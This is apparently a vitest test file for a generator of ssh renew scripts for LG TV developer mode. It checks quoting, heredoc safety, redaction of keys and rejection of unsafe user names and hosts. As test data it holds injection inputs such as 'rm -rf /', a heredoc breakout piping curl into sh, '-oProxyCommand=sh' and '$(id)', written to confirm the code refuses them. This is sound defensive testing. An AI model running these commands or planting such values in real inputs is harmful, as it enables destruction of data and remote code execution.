import { describe, expect, it } from 'vitest';
import type { SavedDevice } from '../../devices/store';
import { HIDDEN_KEY, HIDDEN_PASSPHRASE, fmtCountdown, parseRemaining, renewScript, resetUrl } from './renewScript';

const dev = (over: Partial<SavedDevice> = {}): SavedDevice => ({
  id: 'x',
  name: "Kid's TV; rm -rf /",
  mode: 'devmode',
  host: '192.0.2.10',
  port: 9922,
  username: 'prisoner',
  auth: { kind: 'key', privateKey: '-----BEGIN RSA PRIVATE KEY-----\nabc\n-----END RSA PRIVATE KEY-----\n', passphrase: "A1'B2" },
  createdAt: 0,
  updatedAt: 0,
  ...over,
});

describe('renew script', () => {
  it('quotes every value and slugs the name used in file names', () => {
    const s = renewScript(dev())!;
    expect(s).toContain("DEVICE_NAME='Kid-s-TV-rm--rf'");
    expect(s).toContain("DEVICE_PASSPHRASE='A1'\\''B2'");
    expect(s).toContain("DEVICE_HOST='192.0.2.10'");
    expect(s).toContain("<<'END_OF_PRIVKEY'\n-----BEGIN RSA PRIVATE KEY-----\nabc\n-----END RSA PRIVATE KEY-----\nEND_OF_PRIVKEY");
  });

  it('refuses a key that could break out of the heredoc', () => {
    const evil = '-----BEGIN RSA PRIVATE KEY-----\nabc\nEND_OF_PRIVKEY\ncurl https://example.com/p|sh\n-----END RSA PRIVATE KEY-----';
    expect(renewScript(dev({ auth: { kind: 'key', privateKey: evil } }))).toBeNull();
    // Windows line endings are fine.
    const crlf = '-----BEGIN RSA PRIVATE KEY-----\r\nabc\r\n-----END RSA PRIVATE KEY-----\r\n';
    expect(renewScript(dev({ auth: { kind: 'key', privateKey: crlf } }))).not.toContain('\r');
  });

  it('passes the user and host to ssh as -l / after --, never as user@host', () => {
    const s = renewScript(dev())!;
    expect(s).toContain('-p "${DEVICE_PORT}" -l "${DEVICE_USERNAME}" -- "${DEVICE_HOST}"');
    expect(s).not.toContain('@${DEVICE_HOST}');
    // ssh wants IPv6 without brackets.
    expect(renewScript(dev({ host: '[2001:db8::1]' }))).toContain("DEVICE_HOST='2001:db8::1'");
  });

  it('refuses a user name or host that could be read as an ssh option, or that the forms would refuse', () => {
    for (const username of ['-oProxyCommand=sh', '-l', 'root user', 'Root', "a'b", '', 'a'.repeat(40)]) {
      expect(renewScript(dev({ username }))).toBeNull();
    }
    for (const host of ['-oProxyCommand=sh', '-p', '192.0.2.10 -p 22', 'tv;rm', 'user@192.0.2.10', '$(id)', '', ' 192.0.2.10']) {
      expect(renewScript(dev({ host }))).toBeNull();
    }
    expect(renewScript(dev({ port: 0 }))).toBeNull();
  });

  it('can hide the key and passphrase for showing on screen', () => {
    const shown = renewScript(dev(), { redact: true })!;
    expect(shown).not.toContain('BEGIN RSA PRIVATE KEY');
    expect(shown).not.toContain('A1');
    expect(shown).toContain(`<<'END_OF_PRIVKEY'\n${HIDDEN_KEY}\nEND_OF_PRIVKEY`);
    expect(shown).toContain(`DEVICE_PASSPHRASE='${HIDDEN_PASSPHRASE}'`);
    // No passphrase: nothing to hide there.
    const noPass = renewScript(dev({ auth: { kind: 'key', privateKey: '-----BEGIN RSA PRIVATE KEY-----\nabc\n-----END RSA PRIVATE KEY-----\n' } }), { redact: true });
    expect(noPass).toContain("DEVICE_PASSPHRASE=''");
  });

  it('needs a key login', () => {
    expect(renewScript(dev({ auth: { kind: 'password', password: 'x' } }))).toBeNull();
  });

  it('builds the renew URL and parses LG’s time', () => {
    expect(resetUrl('ABC123')).toBe('https://developer.lge.com/secure/ResetDevModeSession.dev?sessionToken=ABC123');
    expect(parseRemaining('742:15:03')).toBe(((742 * 60 + 15) * 60 + 3) * 1000);
    expect(parseRemaining('soon')).toBeNull();
    expect(fmtCountdown(((742 * 60 + 15) * 60 + 3) * 1000)).toBe('742:15:03');
    expect(fmtCountdown(-5)).toBe('00:00:00');
  });
});
